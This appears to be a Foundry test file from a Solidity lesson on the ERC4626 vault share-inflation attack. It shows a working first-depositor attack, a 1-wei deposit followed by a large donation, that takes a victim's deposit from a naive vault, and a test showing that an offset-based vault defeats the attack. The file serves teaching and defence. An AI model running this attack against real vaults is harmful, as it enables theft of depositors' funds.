// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {NaiveVault, SafeVault} from "../src/L31_ERC4626Vault.sol";

contract Asset is ERC20 {
    constructor() ERC20("Asset", "AST") {}

    function mint(address to, uint256 a) external {
        _mint(to, a);
    }
}

contract L31Test is Test {
    Asset a;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        a = new Asset();
        a.mint(attacker, 10_001 ether);
        a.mint(victim, 10_000 ether);
    }

    function _attack(address vault) internal returns (uint256 victimShares) {
        vm.startPrank(attacker);
        a.approve(vault, type(uint256).max);
        NaiveVault(vault).deposit(1, attacker); // 1 wei -> 1 share
        a.transfer(vault, 10_000 ether); // donate to inflate share price
        vm.stopPrank();
        vm.startPrank(victim);
        a.approve(vault, type(uint256).max);
        victimShares = NaiveVault(vault).deposit(10_000 ether, victim);
        vm.stopPrank();
    }

    function test_DepositRedeemRoundTrip() public {
        SafeVault v = new SafeVault(a);
        vm.startPrank(victim);
        a.approve(address(v), 100 ether);
        uint256 s = v.deposit(100 ether, victim);
        assertEq(v.convertToAssets(s), 100 ether);
        v.redeem(s, victim, victim);
        vm.stopPrank();
        assertEq(a.balanceOf(victim), 10_000 ether);
    }

    function test_InflationAttackStealsFromNaiveVault() public {
        NaiveVault v = new NaiveVault(a);
        uint256 s = _attack(address(v));
        assertEq(s, 0, "victim minted zero shares");
        vm.prank(attacker);
        v.redeem(1, attacker, attacker);
        assertGt(a.balanceOf(attacker), 10_001 ether + 9_000 ether, "attacker took the victim's deposit");
    }

    function test_OffsetDefeatsInflationAttack() public {
        SafeVault v = new SafeVault(a);
        uint256 s = _attack(address(v));
        assertGt(s, 0);
        vm.prank(victim);
        uint256 back = v.redeem(s, victim, victim);
        assertGt(back, 9_990 ether, "victim keeps ~all of their deposit");
    }
}
